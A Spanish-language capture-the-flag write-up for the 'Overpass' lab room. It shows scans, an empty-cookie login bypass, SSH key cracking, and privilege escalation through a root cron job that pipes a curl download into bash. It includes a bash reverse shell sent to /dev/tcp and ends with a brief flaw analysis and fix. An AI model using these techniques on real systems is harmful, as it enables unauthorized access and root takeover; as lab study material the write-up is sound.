# Overpass
Room bastante interesante que explota conceptos interesantes como Broken Auth y con un Privesc poco común

Interesante: BrokenAuth , 
## Initial Scan
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
```

## Enum
### HTTP 
En el fuente de la main page podemos encontar el siguiente mensaje 
```
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```
Probablemente haga alusión al cifrado Cesar, puede que mas adelante nos haga falta

#### Gobuster
```
/aboutus (Status: 301)
/admin (Status: 301) -> Login Portal
/css (Status: 301)
/downloads (Status: 301)
/img (Status: 301)
```

Si observamos el codigo javascript usado para el login vemos que podemos hacer un bypass simplemente dejando la cookie sin valor, usando el siguiente snippet en la consola del navegador
```
Cookies.set("SessionToken", "")
```
Esto nos lleva a una zona de administración donde podemos ver una clave SSH para el usuario james, crackeamos la clave con ssh2john y vemos que la password para usarla es james13, con esto nos logeamos sin mas problema

## Privesc
En el crontab encontramos la siguiente tarea
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
Para poder escalar usando esto necesitamos cambiar ese script por uno nuestro, esto lo podemos lograr cambiando la IP correspondiente a overpass.thm por la nuestra
Editamos /etc/hosts para cambiar la IP de overpass.thm por la nuestra , abrimos un servidor de python en local y creamos este script en el PATH especificado
```bash
#!/bin/bash
bash -i >& /dev/tcp/IP/8080 0>&1
```

Y con esto solo quedaria abrir un listener en nuestra máquina y coger la root flag 
# Analisís de la intrusión
### Vuln auth method
Para gestionar el login el script utilizado es vulnerable ya que permite acceder con una cookie vacia bypasseando el login
### Information Leak
En el servidor podemos encontrar informacion sensible como claves ssh expuestas permitiendo que al bypassear la autenticación obtengamos acceso completo a la máquina
### Bad permisions on /etc/hosts
/etc/host es modificable por usuarios sin privilegios cambiando el host del cronjob por otro

# Soluciones
### Vuln auth method
No controlo suficiente javascript para parchear el metodo, pero trasladar esta autenticación al server side probablemente mejoraría la seguridad del metodo de login
